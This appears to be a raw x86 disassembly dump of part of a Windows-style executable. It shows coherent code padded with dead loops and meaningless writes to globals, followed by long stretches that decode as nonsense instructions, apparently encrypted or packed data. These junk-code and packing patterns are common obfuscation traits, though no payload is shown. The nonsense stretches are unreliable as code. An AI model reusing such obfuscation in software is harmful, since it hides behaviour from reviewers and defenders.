  406246:	sub    edi,edx
  406248:	adc    DWORD PTR ds:0x4245b2,edi
  40624e:	mov    edx,DWORD PTR [ebp-0x4]
  406251:	adc    DWORD PTR ds:0x41abca,0x7639
  40625b:	xor    edx,eax
  40625d:	sbb    DWORD PTR ds:0x4245c2,0x415105
  406267:	add    edx,ecx
  406269:	mov    DWORD PTR ds:0x41abda,0x19aa
  406273:	cmp    edi,edx
  406275:	mov    DWORD PTR ds:0x4150fd,0x443e
  40627f:	jb     0x4072d5
  406285:	mov    edx,DWORD PTR [ebp-0x28]
  406288:	sbb    edi,0x1e1d
  40628e:	mov    edi,DWORD PTR [ebp-0x4]
  406291:	mov    ebx,DWORD PTR ds:0x417e45
  406297:	or     DWORD PTR ds:0x417e3d,ebx
  40629d:	xor    edx,eax
  40629f:	xor    edi,eax
  4062a1:	mov    DWORD PTR ds:0x417e55,0x5fc7
  4062ab:	add    edi,ecx
  4062ad:	dec    ebx
  4062ae:	add    edx,ecx
  4062b0:	dec    ebx
  4062b1:	imul   edx,edi
  4062b4:	sbb    DWORD PTR ds:0x41abe2,0x63fb
  4062be:	mov    edi,DWORD PTR [ebp-0x8]
  4062c1:	mov    DWORD PTR ds:0x41abd2,0x13
  4062cb:	cmp    DWORD PTR ds:0x41abd2,0x0
  4062d2:	je     0x406309
  4062d8:	cmp    DWORD PTR ds:0x41abd2,0x23
  4062df:	jne    0x4062f1
  4062e5:	push   DWORD PTR [ebp-0x18]
  4062e8:	push   DWORD PTR [ebp-0x24]
  4062eb:	call   DWORD PTR ds:0x40d364
  4062f1:	mov    ebx,DWORD PTR ds:0x41abd2
  4062f7:	dec    ebx
  4062f8:	mov    DWORD PTR ds:0x41abd2,ebx
  4062fe:	jmp    0x4062cb
  406303:	sbb    ebx,0x2ce7
  406309:	mov    ebx,DWORD PTR [ebp-0x10]
  40630c:	inc    DWORD PTR ds:0x41abce
  406312:	sub    ebx,edi
  406314:	mov    DWORD PTR ds:0x4245c6,0x7511
  40631e:	cmp    ebx,edx
  406320:	mov    DWORD PTR ds:0x41abd2,0x3d79
  40632a:	ja     0x40635a
  406330:	mov    edx,DWORD PTR [ebp-0x4]
  406333:	mov    DWORD PTR ds:0x412368,0x316e
  40633d:	xor    edx,eax
  40633f:	add    DWORD PTR ds:0x415109,0x4882
  406349:	add    edx,ecx
  40634b:	mov    DWORD PTR ds:0x417e59,0x234c
  406355:	jmp    0x40672b
  40635a:	mov    edx,DWORD PTR [ebp-0x2c]
  40635d:	sbb    DWORD PTR ds:0x412370,0x4f34
  406367:	mov    edi,DWORD PTR [ebp-0x4]
  40636a:	and    ebx,0x5352
  406370:	xor    edx,eax
  406372:	and    DWORD PTR ds:0x415111,0x0
  40637c:	jmp    0x40638e
  406381:	mov    ebx,DWORD PTR ds:0x415111
  406387:	inc    ebx
  406388:	mov    DWORD PTR ds:0x415111,ebx
  40638e:	cmp    DWORD PTR ds:0x415111,0x16
  406395:	jae    0x406508
  40639b:	cmp    DWORD PTR ds:0x415111,0x1c
  4063a2:	jne    0x4063b1
  4063a8:	push   DWORD PTR [ebp-0x1c]
  4063ab:	call   DWORD PTR ds:0x40d1d4
  4063b1:	jmp    0x406381
  4063b6:	jmp    0x406508
  4063bb:	add    eax,DWORD PTR [esi]
  4063bd:	mov    al,ds:0xf969b94b
  4063c2:	inc    esi
  4063c3:	popf   
  4063c4:	imul   ebp,DWORD PTR [ebx-0x6e4fade8],0xffffffbe
  4063cb:	jmp    0x7e7f:0x237e7e0c
  4063d2:	jle    0x4063f6
  4063d4:	jecxz  0x406425
  4063d6:	int3   
  4063d7:	test   BYTE PTR [edi+0x2ea4aeb],cl
  4063dd:	push   ecx
  4063de:	mov    ebx,0xc113fa0d
  4063e3:	stos   DWORD PTR es:[edi],eax
  4063e4:	imul   esi,DWORD PTR [edx],0x5f843adf
  4063ea:	fdivrp st(2),st
  4063ec:	fs xor eax,0x8a41390f
  4063f2:	sar    ebp,1
  4063f4:	inc    edx
  4063f5:	test   BYTE PTR [edi-0x89b7e7c],0x63
  4063fc:	enter  0x9749,0xf7
  406400:	dec    eax
  406401:	pop    edi
  406402:	push   es
  406403:	(bad)  
  406404:	dec    ecx
  406405:	test   al,0x1
  406407:	out    0x6e,al
  406409:	retf   0x3e2a
  40640c:	xor    eax,0xe444eeb9
  406411:	sbb    BYTE PTR [esi+0x4a42c135],al
  406417:	(bad)  
  406418:	outs   dx,DWORD PTR ds:[esi]
  406419:	mov    BYTE PTR [edi],al
  40641b:	aam    0x5c
  40641d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40641e:	and    edi,DWORD PTR [edi+0x758ed8d6]
  406424:	leave  
  406425:	fisttp DWORD PTR [esi]
  406427:	inc    ecx
  406428:	fucom  st(1)
  40642a:	ficom  WORD PTR [edx-0x3b7a900c]
  406430:	ins    DWORD PTR es:[edi],dx
  406431:	jp     0x40643a
  406433:	pop    esp
  406434:	retf   
  406435:	jns    0x406440
  406437:	mov    DWORD PTR [eax+edx*2],edi
  40643a:	mov    BYTE PTR [ebx],ah
  40643c:	xchg   esp,eax
  40643d:	or     al,0xf3
  40643f:	xchg   esp,eax
  406440:	(bad)  
  406441:	jp     0x406475
  406443:	pop    esp
  406444:	and    al,BYTE PTR [esi]
  406446:	xor    cl,BYTE PTR [ecx+ecx*8-0x21b4fc40]
  40644d:	and    DWORD PTR [ebx+esi*2],edi
  406450:	sbb    esi,esi
  406452:	mov    cl,BYTE PTR [ecx-0x555c3e4e]
  406458:	scas   al,BYTE PTR es:[edi]
  406459:	scas   eax,DWORD PTR es:[edi]
  40645a:	aas    
  40645b:	mov    bl,0x6
  40645d:	test   BYTE PTR [edi-0x57f7b036],cl
  406463:	sbb    al,0x67
  406465:	loop   0x406429
  406467:	ds sti 
  406469:	lahf   
  40646a:	cs jl  0x406475
  40646d:	int    0xa8
  40646f:	cmp    al,BYTE PTR [edi]
  406471:	inc    edi
  406472:	(bad)  
  406473:	daa    
  406474:	mov    ch,dh
  406476:	and    al,ah
  406478:	inc    eax
  406479:	fmul   QWORD PTR [edx]
  40647b:	mov    eax,ds:0xfaf12cf0
  406480:	push   ecx
  406481:	adc    DWORD PTR ss:[edi-0x25a816],ebx
  406488:	sub    bh,ah
  40648a:	mov    esp,0xbd8d09
  40648f:	mov    ecx,0x56a2a2a1
  406494:	sahf   
  406495:	mov    ebx,0x525e4266
  40649a:	(bad)  
  40649b:	int3   
  40649c:	push   cs
  40649d:	jge    0x4064c2
  40649f:	arpl   di,bx
  4064a1:	and    bl,BYTE PTR [ecx]
  4064a3:	loop   0x4064ee
  4064a5:	mov    cs,WORD PTR cs:[edx+0x16]
  4064a9:	test   BYTE PTR [eax],al
  4064ab:	repz jg 0x4064e4
  4064ae:	jecxz  0x406490
  4064b0:	jmp    0x7a13:0xc085ac75
  4064b7:	inc    esi
  4064b8:	mov    al,0x42
  4064ba:	pop    esi
  4064bb:	push   0xffffffd5
  4064bd:	xor    ebp,DWORD PTR [ebx+ebp*2]
  4064c0:	sub    eax,0x591a38bd
  4064c5:	sti    
  4064c6:	dec    ebx
  4064c7:	mov    ebp,0xf66cdcb2
  4064cc:	jp     0x406527
  4064ce:	mov    ebp,0x97707a70
  4064d3:	bound  esi,QWORD PTR [ebx+0x185f39e3]
  4064d9:	dec    ebx
  4064da:	add    al,0x5a
  4064dc:	fisub  DWORD PTR [edi+0x7b]
  4064df:	(bad)  
  4064e0:	mov    esp,0xbfcc11e4
  4064e5:	in     eax,dx
  4064e6:	or     DWORD PTR [ebx+0x7d6cc0a7],esi
  4064ec:	and    bl,ch
  4064ee:	sub    al,0x4a
  4064f0:	shl    DWORD PTR [edi],1
  4064f2:	fadd   DWORD PTR [edi+0x6b]
  4064f5:	inc    esp
  4064f6:	outs   dx,BYTE PTR ds:[esi]
  4064f7:	push   ds
  4064f8:	cwde   
  4064f9:	sub    eax,0x49b17720
  4064fe:	out    0x4e,eax
  406500:	mov    esp,0x35111a99
  406505:	xchg   edx,eax
  406506:	sub    eax,0x3f833ab
  40650b:	stc    
  40650c:	add    edx,ecx
  40650e:	imul   edx,edi
  406511:	mov    edi,DWORD PTR [ebp-0x8]
  406514:	jmp    0x406666
  406519:	jbe    0x406527
  40651b:	xchg   ebp,eax
  40651c:	call   0xe08bdec6
  406521:	adc    DWORD PTR ds:0xc5b74057,edi
  406527:	push   0x7e0d9f32
  40652c:	jle    0x406551
  40652e:	jg     0x4065ae
  406530:	jle    0x4064c1
  406532:	std    
  406533:	adc    bl,al
  406535:	leave  
  406536:	inc    eax
  406537:	cmp    eax,0x7c87970b
  40653c:	clc    
  40653d:	xor    al,0x46
  40653f:	into   
  406540:	adc    dh,BYTE PTR [eax]
  406542:	lods   eax,DWORD PTR ds:[esi]
  406543:	dec    esi
  406544:	xor    BYTE PTR [edx],dl
  406546:	shr    DWORD PTR [edx-0x56c4ede3],1
  40654c:	(bad)  
  40654d:	adc    bh,dl
  40654f:	jg     0x40652b
  406551:	jne    0x4065b8
  406553:	xor    BYTE PTR [esi],al
  406555:	cmp    eax,0x98e4cc3b
  40655a:	lahf   
  40655b:	call   0xd455574e
  406560:	aam    0x66
  406562:	or     al,0x2f
  406564:	(bad)  
  406565:	in     al,dx
  406566:	pop    es
  406567:	xor    al,0xa0
  406569:	jge    0x4065bb
  40656b:	outs   dx,DWORD PTR ds:[esi]
  40656c:	call   0x170660cf
  406571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406572:	inc    esp
  406573:	cwde   
  406574:	xchg   ebx,eax
  406575:	daa    
  406576:	fadd   st,st(3)
  406578:	fst    QWORD PTR [esi+0x25]
  40657b:	sub    ah,0xca
  40657e:	nop
  40657f:	cli    
  406580:	imul   ebp,ebx,0xa197887
  406586:	xor    eax,0x1996359e
  40658b:	and    ecx,DWORD PTR [ebx]
  40658d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40658e:	mov    bl,ch
  406590:	loopne 0x406544
  406592:	in     eax,dx
  406593:	jle    0x40651a
  406595:	ds scas al,BYTE PTR es:[edi]
  406597:	clc    
  406598:	enter  0xe3db,0x65
  40659c:	jns    0x406606
  40659e:	pop    esp
  40659f:	shr    BYTE PTR [esi+0xd9f121e],cl
  4065a5:	dec    edx
  4065a6:	mov    edi,edi
  4065a8:	jne    0x406597
  4065aa:	jne    0x4065d5
  4065ac:	or     esi,DWORD PTR [ebp-0x26fe12a3]
  4065b2:	sahf   
  4065b3:	sahf   
  4065b4:	data16 jge 0x406570
  4065b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065b8:	in     al,dx
  4065b9:	push   cs
  4065ba:	outs   dx,BYTE PTR ds:[esi]
  4065bb:	ja     0x4065cd
  4065bd:	dec    ebx
  4065be:	sahf   
  4065bf:	shl    ebp,0x2a
  4065c2:	xlat   BYTE PTR ds:[ebx]
  4065c3:	inc    eax
  4065c4:	dec    esp
  4065c5:	lock mov dh,0x59
  4065c8:	lahf   
  4065c9:	xor    DWORD PTR [edx-0x11fdeeda],esi
  4065cf:	add    cl,BYTE PTR [ecx+0x78]
  4065d2:	cmp    BYTE PTR [edi-0x14],dh
  4065d5:	dec    edx
  4065d6:	cmp    eax,ecx
  4065d8:	out    dx,al
  4065d9:	(bad)  
  4065da:	and    eax,0x7c25278b
  4065df:	gs nop
  4065e1:	and    eax,ebp
  4065e3:	repz xor DWORD PTR [ecx],ebp
  4065e6:	cli    
  4065e7:	scas   eax,DWORD PTR es:[edi]
  4065e8:	push   ss
  4065e9:	jle    0x406619
  4065eb:	sbb    eax,0xe9919264
  4065f0:	push   esp
  4065f1:	xchg   edx,eax
  4065f2:	fisubr DWORD PTR [ebx+0x3f]
  4065f5:	push   0xef2518d3
  4065fa:	in     eax,0xcc
  4065fc:	test   DWORD PTR ds:0x155c3d2a,0x8f70fcc3
  406606:	xchg   ecx,eax
  406607:	cld    
  406608:	mov    dh,BYTE PTR [edx+0x11]
  40660b:	cmc    
  40660c:	cs aaa 
  40660e:	sbb    BYTE PTR [edx+0x15],ah
  406611:	adc    BYTE PTR [esi+eiz*4-0x58888d41],bl
  406618:	jmp    0x55cf:0x7fdea445
  40661f:	ins    BYTE PTR es:[di],dx
  406621:	mov    bl,0xf9
  406623:	sbb    edi,DWORD PTR [ebx-0x27]
  406626:	and    BYTE PTR [ecx+0x74],ah
  406629:	xchg   ebp,eax
  40662a:	inc    edx
  40662b:	js     0x406664
  40662d:	mov    WORD PTR [edi+0x55],es
  406630:	dec    esp
  406631:	mov    ebx,0x9aae4a49
  406636:	ds push ebx
  406638:	jmp    0xe4aacff2
  40663d:	(bad)  
  40663e:	pushf  
  40663f:	jecxz  0x406696
  406641:	jnp    0x406665
  406643:	adc    esp,eax
  406645:	adc    BYTE PTR [ebx],al
  406647:	or     DWORD PTR [ebx+0x71],ecx
  40664a:	dec    edi
  40664b:	add    edx,DWORD PTR [edi-0x26]
  40664e:	fdiv   QWORD PTR [ebx-0x38]
  406651:	push   ebp
  406652:	fwait
  406653:	cmovae edx,DWORD PTR [ebx-0x65f65f60]
  40665a:	pop    edi
  40665b:	repz xor ah,BYTE PTR [eax+0x6eaf76f]
  406662:	xor    ebx,ecx
  406664:	clc    
  406665:	cmp    BYTE PTR [ebx-0x20d40fa3],cl
  40666b:	cmp    ebx,edx
  40666d:	ja     0x40667b
  406673:	mov    edx,DWORD PTR [ebp-0x28]
  406676:	jmp    0x40671d
  40667b:	mov    edx,DWORD PTR [ebp-0x30]
  40667e:	mov    edi,DWORD PTR [ebp-0x4]
  406681:	xor    edx,eax
  406683:	xor    edi,eax
  406685:	add    edi,ecx
  406687:	add    edx,ecx
  406689:	imul   edx,edi
  40668c:	mov    edi,DWORD PTR [ebp-0x8]
  40668f:	mov    ebx,DWORD PTR [ebp-0x10]
  406692:	sub    ebx,edi
  406694:	cmp    ebx,edx
  406696:	ja     0x4066a4
  40669c:	mov    edx,DWORD PTR [ebp-0x2c]
  40669f:	jmp    0x40671d
  4066a4:	mov    edx,DWORD PTR [ebp-0x34]
  4066a7:	mov    edi,DWORD PTR [ebp-0x4]
  4066aa:	xor    edx,eax
  4066ac:	xor    edi,eax
  4066ae:	add    edi,ecx
  4066b0:	add    edx,ecx
  4066b2:	imul   edx,edi
  4066b5:	mov    edi,DWORD PTR [ebp-0x8]
  4066b8:	mov    ebx,DWORD PTR [ebp-0x10]
  4066bb:	sub    ebx,edi
  4066bd:	cmp    ebx,edx
  4066bf:	ja     0x4066cd
  4066c5:	mov    edx,DWORD PTR [ebp-0x30]
  4066c8:	jmp    0x40671d
  4066cd:	mov    edx,DWORD PTR [ebp-0x38]
  4066d0:	mov    edi,DWORD PTR [ebp-0x4]
  4066d3:	xor    edx,eax
  4066d5:	xor    edi,eax
  4066d7:	add    edi,ecx
  4066d9:	add    edx,ecx
  4066db:	imul   edx,edi
  4066de:	mov    edi,DWORD PTR [ebp-0x8]
  4066e1:	mov    ebx,DWORD PTR [ebp-0x10]
  4066e4:	sub    ebx,edi
  4066e6:	cmp    ebx,edx
  4066e8:	ja     0x4066f6
  4066ee:	mov    edx,DWORD PTR [ebp-0x34]
  4066f1:	jmp    0x40671d
  4066f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4066f9:	mov    edi,DWORD PTR [ebp-0x4]
  4066fc:	xor    edx,eax
  4066fe:	xor    edi,eax
  406700:	add    edx,ecx
  406702:	add    edi,ecx
  406704:	imul   edx,edi
  406707:	mov    edi,DWORD PTR [ebp-0x8]
  40670a:	mov    ebx,DWORD PTR [ebp-0x10]
  40670d:	sub    ebx,edi
  40670f:	cmp    ebx,edx
  406711:	mov    edx,DWORD PTR [ebp-0x38]
  406714:	jbe    0x40671d
  40671a:	mov    edx,DWORD PTR [ebp-0x3c]
  40671d:	mov    edi,DWORD PTR [ebp-0x4]
  406720:	xor    edi,eax
  406722:	xor    edx,eax
  406724:	add    edi,ecx
  406726:	add    edx,ecx
  406728:	imul   edx,edi
  40672b:	mov    DWORD PTR [ebp+0xc],edx
  40672e:	mov    edx,DWORD PTR [ebp+0xc]
  406731:	mov    DWORD PTR [ebp-0x24],edx
  406734:	mov    edx,DWORD PTR [ebp-0x8]
  406737:	jmp    0x406889
  40673c:	lock cs xchg ebx,eax
  40673f:	xchg   esi,eax
  406740:	mov    eax,ds:0xd53889bb
  406745:	and    esp,DWORD PTR [ebp+0x1b]
  406748:	mov    edi,0x40295962
  40674d:	add    bh,BYTE PTR [esi+0x7e]
  406750:	and    edi,DWORD PTR [edi+0x7e]
  406753:	jle    0x4066d7
  406755:	pop    ds
  406756:	mov    edi,0x2256ac84
  40675b:	cwde   
  40675c:	inc    ebx
  40675d:	mov    cl,0xce
  40675f:	div    BYTE PTR [esp+eax*2]
  406762:	pop    ecx
  406763:	call   0x6f76:0xd0b01358
  40676a:	jl     0x4067e5
  40676c:	jnp    0x4067eb
  40676e:	adc    DWORD PTR [esi],0xdb91375b
  406774:	rcl    DWORD PTR [ebp+eiz*4-0x6b],1
  406778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406779:	sub    BYTE PTR [ebp-0x21955201],ch
  40677f:	ss dec ebp
  406781:	push   0xfd210285
  406786:	sbb    ebp,ebx
  406788:	push   cs
  406789:	pop    esi
  40678a:	mov    ebp,0x620cc31f
  40678f:	mov    ds:0x3979dd47,al
  406794:	retf   0x89df
  406797:	pusha  
  406798:	test   al,0x4b
  40679a:	push   esi
  40679b:	jno    0x40676b
  40679d:	cmovg  ebx,DWORD PTR [eax+ebx*8]
  4067a1:	and    eax,0x900613af
  4067a6:	jbe    0x40679e
  4067a8:	push   ds
  4067a9:	out    dx,al
  4067aa:	jecxz  0x406798
  4067ac:	ins    BYTE PTR es:[edi],dx
  4067ad:	jp     0x4067bb
  4067af:	daa    
  4067b0:	fsubr  QWORD PTR [edi+0x61faddfb]
  4067b6:	push   edi
  4067b7:	cmp    DWORD PTR [bp+0x528c],esp
  4067bc:	push   ecx
  4067bd:	inc    edi
  4067be:	push   esi
  4067bf:	sar    BYTE PTR [ebx-0x16],1
  4067c2:	sub    al,0xb0
  4067c4:	mov    esp,0x9647aedf
  4067c9:	(bad)  
  4067ca:	adc    ah,BYTE PTR [edi+0x13]
  4067cd:	push   es
  4067ce:	fbld   TBYTE PTR [eax+eax*1]
  4067d1:	lods   eax,DWORD PTR ds:[esi]
  4067d2:	jge    0x4067f2
  4067d4:	jecxz  0x40683d
  4067d6:	mov    al,0xd1
  4067d8:	dec    ecx
  4067d9:	cmp    ebx,0x72
  4067dc:	scas   eax,DWORD PTR es:[edi]
  4067dd:	shl    esi,cl
  4067df:	sub    cl,bh
  4067e1:	adc    eax,0x742d395d
  4067e6:	xchg   esp,eax
  4067e7:	outs   dx,DWORD PTR ds:[esi]
  4067e8:	aad    0xae
  4067ea:	dec    esi
  4067eb:	add    eax,0x8d91a421
  4067f0:	dec    ebx
  4067f1:	inc    ebp
  4067f2:	mov    ebx,DWORD PTR [edi+0x60]
  4067f5:	or     DWORD PTR [edi],ebx
  4067f7:	mov    edx,0x7c52d351
  4067fc:	adc    cl,ch
  4067fe:	scas   eax,DWORD PTR es:[edi]
  4067ff:	sahf   
  406800:	inc    ebp
  406801:	jg     0x406816
  406803:	jnp    0x406857
  406805:	lahf   
  406806:	mov    BYTE PTR [eax],0x3d
  406809:	push   ebp
  40680a:	pop    eax
  40680b:	dec    eax
  40680c:	mov    ebp,0x84424e97
  406811:	bound  edi,QWORD PTR [edi+0x6f]
  406814:	pop    DWORD PTR [ebp+0x4fc35b5b]
  40681a:	fnstcw WORD PTR [ebx-0x3c]
  40681d:	aas    
  40681e:	ds icebp 
  406820:	fwait
  406821:	repnz xlat BYTE PTR ds:[ebx]
  406823:	cmp    BYTE PTR [ebp+0x13f1425e],dl
  406829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40682a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40682b:	ror    DWORD PTR [ecx-0x39],1
  40682e:	fisttp WORD PTR [esi]
  406830:	push   ebp
  406831:	inc    ecx
  406832:	pop    ebp
  406833:	mov    esp,0x4b561702
  406838:	jp     0x406853
  40683a:	pop    ecx
  40683b:	mov    edi,DWORD PTR [edx]
  40683d:	enter  0x5419,0x70
  406841:	xchg   ebp,eax
  406842:	sbb    edx,DWORD PTR [ebx-0x7004b956]
  406848:	retf   0x9a3a
  40684b:	daa    
  40684c:	inc    ebp
  40684d:	cdq    
  40684e:	mov    edx,0xb65d2bca
  406853:	repnz mov dh,BYTE PTR [edx-0x7d]
  406857:	fldcw  WORD PTR [ecx-0x4963c712]
  40685d:	(bad)  
  40685e:	pop    ebp
  40685f:	outs   dx,BYTE PTR ds:[esi]
  406860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406861:	cs es jle 0x40685a
  406865:	sub    DWORD PTR [edx+0xd],esi
  406868:	xor    DWORD PTR [edx-0x232ceb57],eax
  40686e:	mov    dh,0x23
  406870:	xor    DWORD PTR ds:0x761394c9,esp
  406876:	and    al,dl
  406878:	arpl   WORD PTR [ecx-0x4d],cx
  40687b:	lock (bad) 
  40687d:	fbld   TBYTE PTR [ebp-0x75]
  406880:	dec    esi
  406881:	cmp    DWORD PTR [ebx+eiz*8],edi
  406884:	les    eax,FWORD PTR [edx+0x3a931cc]
  40688a:	push   ebp
  40688b:	rol    bh,0x45
  40688e:	call   0xf8dcedcb
  406893:	mov    DWORD PTR [ebp-0x1c],edx
  406896:	mov    DWORD PTR [ebp-0xc],0xf89c853b
  40689d:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4068a4:	mov    edx,DWORD PTR [ebp-0x18]
  4068a7:	jmp    0x4069f9
  4068ac:	daa    
  4068ad:	mov    ecx,0x7980c50e
  4068b2:	in     eax,0x79
  4068b4:	dec    ebp
  4068b5:	push   esp
  4068b6:	push   ecx
  4068b7:	cmp    al,0xdd
  4068b9:	mov    ch,0xae
  4068bb:	mov    esp,0x7e7e0075
  4068c0:	and    edi,DWORD PTR [edi+0x7e]
  4068c3:	jle    0x4068f1
  4068c5:	out    0x13,eax
  4068c7:	add    ch,ah
  4068c9:	out    0x50,eax
  4068cb:	cmp    ebp,0x9b4238fe
  4068d1:	sub    edi,DWORD PTR [esi-0x3b72528e]
  4068d7:	sub    al,0x5e
  4068d9:	inc    eax
  4068da:	xchg   ecx,eax
  4068db:	shl    DWORD PTR [esi-0x2fa53c62],1
  4068e1:	add    eax,0x214724b0
  4068e6:	aam    0x9b
  4068e8:	les    ebx,FWORD PTR [ebp-0x6276f5c0]
  4068ee:	sti    
  4068ef:	pop    ss
  4068f0:	xchg   esp,eax
  4068f1:	mov    ds:0xcd3286df,eax
  4068f6:	dec    eax
  4068f7:	frstor ds:0xeaa5a14e
  4068fd:	ss mov al,0x2
  406900:	aaa    
  406901:	jb     0x4068d3
  406903:	sbb    al,0xd1
  406905:	shr    BYTE PTR [eax-0x15],1
  406908:	add    DWORD PTR [ecx-0x627f4bd1],ecx
  40690e:	ret    
  40690f:	fld    QWORD PTR [esi-0x25]
  406912:	shr    BYTE PTR [ebx-0x68],0x56
  406916:	dec    esi
  406917:	dec    ebx
  406918:	jp     0x40691e
  40691a:	fwait
  40691b:	push   esi
  40691c:	mov    bh,0x46
  40691e:	pop    edi
  40691f:	ja     0x406934
  406921:	push   ds
  406922:	mov    dh,0x75
  406924:	out    0xcd,eax
  406926:	pop    ebx
  406927:	fdiv   st(5),st
  406929:	sub    al,0x38
  40692b:	mov    cl,0x71
  40692d:	inc    edi
  40692e:	adc    eax,0x806fde4c
  406933:	mov    BYTE PTR [ecx-0x113a8071],ah
  406939:	les    ebx,FWORD PTR [edi-0x47]
  40693c:	mov    esp,esi
  40693e:	ss cwde 
  406940:	add    BYTE PTR [esi+0x7e],al
  406943:	shl    WORD PTR [ebp+0x72],1
  406947:	and    ch,ah
  406949:	(bad)  
  40694a:	xor    cl,dh
  40694c:	pop    esp
  40694d:	and    ch,BYTE PTR [ebx+0x2e]
  406950:	sbb    eax,0x2901c0d5
  406955:	retf   0x8878
  406958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406959:	or     al,0x54
  40695b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40695c:	rol    BYTE PTR [ebp-0x6de27f33],1
  406962:	jp     0x406916
  406964:	push   ss
  406965:	loopne 0x406964
  406967:	sub    BYTE PTR [eax-0x5a02d478],dh
  40696d:	in     al,dx
  40696e:	sbb    dl,BYTE PTR [edi]
  406970:	dec    esi
  406971:	push   0xd00975bf
  406976:	add    ecx,DWORD PTR [ebp-0x63]
  406979:	aam    0xbb
  40697b:	xor    BYTE PTR [ebp-0x59f1336b],0x32
  406982:	dec    edx
  406983:	femms  
  406985:	add    bh,dh
  406987:	push   ecx
  406988:	outs   dx,BYTE PTR ds:[esi]
  406989:	jle    0x4069c0
  40698b:	pusha  
  40698c:	rcl    DWORD PTR [eax+0x50],cl
  40698f:	inc    esp
  406990:	cli    
  406991:	mov    dh,0x8e
  406993:	push   cs
  406994:	and    al,0xa9
  406996:	sub    eax,0xbfbbf688
  40699b:	dec    esp
  40699c:	call   FWORD PTR [ebx-0x578e4c42]
  4069a2:	jno    0x406959
  4069a4:	data16 (bad) 
  4069a6:	out    dx,eax
  4069a7:	or     eax,0xa0be94eb
  4069ac:	mov    eax,ds:0xe7956ee0
  4069b1:	push   edx
  4069b2:	imul   edx,ebx,0xffffffc0
  4069b5:	aas    
  4069b6:	dec    eax
  4069b7:	xchg   ch,al
  4069b9:	dec    eax
  4069ba:	or     DWORD PTR [ebx],edx
  4069bc:	push   edx
  4069bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069be:	psubusb mm3,QWORD PTR [eax]
  4069c1:	out    dx,eax
  4069c2:	pop    eax
  4069c3:	jge    0x406964
  4069c5:	pop    esi
  4069c6:	pop    ecx
  4069c7:	icebp  
  4069c8:	aam    0x29
  4069ca:	xor    BYTE PTR [edx-0x3f],al
  4069cd:	cmc    
  4069ce:	mov    esi,0x469a79fa
  4069d3:	hlt    
  4069d4:	fdivr  DWORD PTR [esi]
  4069d6:	scas   eax,DWORD PTR es:[edi]
  4069d7:	inc    eax
  4069d8:	or     eax,0xed91c13b
  4069dd:	mov    eax,ds:0x1b8d93f5
  4069e2:	sbb    esi,eax
  4069e4:	adc    al,0x26
  4069e6:	inc    eax
  4069e7:	mov    ebp,0xebe233ef
  4069ec:	or     eax,0xdd661f46
  4069f1:	je     0x406983
  4069f3:	in     al,dx
  4069f4:	push   edi
  4069f5:	mov    bl,0x6d
  4069f7:	and    esi,DWORD PTR gs:[ebx]
  4069fa:	shr    cl,1
  4069fc:	dec    ebp
  4069fd:	add    DWORD PTR [eax],eax
  4069ff:	add    ch,cl
  406a01:	sti    
  406a02:	mov    ebx,0x65b3b933
  406a07:	stc    
  406a08:	repnz add eax,0x46fa7a93
  406a0e:	sub    edx,DWORD PTR [edx+0x7e7e013e]
  406a14:	and    edi,DWORD PTR [edi+0x7e]
  406a17:	jle    0x4069c9
  406a19:	xchg   BYTE PTR [ebp+0x210ad912],cl
  406a1f:	arpl   WORD PTR [ecx-0x24],bx
  406a22:	(bad)  
  406a23:	mov    dl,0xf1
  406a25:	pop    edx
  406a26:	cmp    al,0x6c
  406a28:	pop    edi
  406a29:	clc    
  406a2a:	cdq    
  406a2b:	fcomp  QWORD PTR [ebx]
  406a2d:	fisttp DWORD PTR [ebp-0x3]
  406a30:	mov    ebx,0xa7c758a7
  406a35:	push   ss
  406a36:	jl     0x406a0a
  406a38:	aad    0xce
  406a3a:	cdq    
  406a3b:	add    al,0x8c
  406a3d:	adc    esp,0x9cf0a7a6
  406a43:	jne    0x406a68
  406a45:	mov    ebx,0x11d1232e
  406a4a:	mov    al,ds:0x24af6554
  406a4f:	mov    edx,DWORD PTR ds:0x88ac2e84
  406a55:	push   es
  406a56:	ds arpl sp,bp
  406a59:	(bad)  
  406a5a:	pop    ecx
  406a5b:	mov    es,WORD PTR [esi-0x7632af35]
  406a61:	lock mov al,0xd4
  406a64:	and    ch,0x31
  406a67:	dec    esi
  406a68:	inc    eax
  406a69:	mov    al,ds:0x31e80b39
  406a6e:	ja     0x406ae8
  406a70:	retf   0x13c5
  406a73:	jp     0x406a36
  406a75:	out    0xe8,eax
  406a77:	sbb    dl,ch
  406a79:	jle    0x406a88
  406a7b:	mov    ch,0x73
  406a7d:	xlat   BYTE PTR ds:[ebx]
  406a7e:	call   0xdaa4:0x1cf3d735
  406a85:	enter  0xcf66,0xc4
  406a89:	mov    cl,0x90
  406a8b:	daa    
  406a8c:	jp     0x406afd
  406a8e:	cdq    
  406a8f:	mov    cl,0x8d
  406a91:	data16 clc 
  406a93:	push   ebp
  406a94:	jnp    0x406a38
  406a96:	mov    WORD PTR [eax],?
  406a98:	or     al,0xc8
  406a9a:	jno    0x406a22
  406a9c:	push   eax
  406a9d:	or     edx,eax
  406a9f:	out    0xb1,al
  406aa1:	push   cs
  406aa2:	fs push eax
  406aa4:	add    edi,DWORD PTR [ebp+0x77]
  406aa7:	mov    edx,0x9e1cc842
  406aac:	and    BYTE PTR [ebp-0x130802f9],bh
  406ab2:	cld    
  406ab3:	ror    BYTE PTR [ebx+esi*4],cl
  406ab6:	jno    0x406b22
  406ab8:	cmp    al,0xf5
  406aba:	ror    BYTE PTR [edi],1
  406abc:	jae    0x406a4d
  406abe:	stc    
  406abf:	ret    0x496d
  406ac2:	aaa    
  406ac3:	mov    esi,0x30a70eb
  406ac8:	adc    dl,BYTE PTR [edi]
  406aca:	jno    0x406ab8
  406acc:	jne    0x406a56
  406ace:	or     DWORD PTR [edx+0x2b],eax
  406ad1:	jae    0x406a5f
